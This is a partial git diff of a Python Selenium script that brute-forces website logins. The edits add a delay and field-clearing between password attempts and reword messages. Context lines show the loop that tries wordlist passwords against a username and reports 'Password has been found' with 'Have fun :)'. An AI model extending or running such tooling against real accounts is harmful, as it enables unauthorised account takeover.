@@ -1,4 +1,4 @@
-# Coded by METACHAR
+# Coded by METACHAR and edited by GREATEST125
 # Looking to work with other hit me up on my email @metachar1@gmail.com <--
 import sys
 import datetime
@@ -13,8 +13,6 @@ from selenium.common.exceptions import NoSuchElementException
 from selenium.webdriver.common.by import By
 from selenium.webdriver.support.ui import WebDriverWait
 from selenium.webdriver.support import expected_conditions as EC
-
-
 
 #Graphics
 class color:
@@ -98,12 +96,15 @@ def brutes(username, username_selector ,password_selector,login_btn_selector,pas
                 print ('------------------------')
                 print (color.GREEN + 'Tried password: '+color.RED + line + color.GREEN + 'for user: '+color.RED+ username)
                 print ('------------------------')
+                t.sleep(1)
+                Sel_user = browser.find_element_by_css_selector(username_selector).clear();
         except KeyboardInterrupt: #returns to main menu if ctrl C is used
             print('CTRL C')
             break
         except selenium.common.exceptions.NoSuchElementException:
             print ('AN ELEMENT HAS BEEN REMOVED FROM THE PAGE SOURCE THIS COULD MEAN 2 THINGS THE PASSWORD WAS FOUND OR YOU HAVE BEEN LOCKED OUT OF ATTEMPTS! ')
-            print ('LAST PASS ATTEMPT BELLOW')
+
+            print ('LAST PASSWORD ATTEMPT BELLOW')
             print (color.GREEN + 'Password has been found: {0}'.format(line))
             print (color.YELLOW + 'Have fun :)')
             exit()
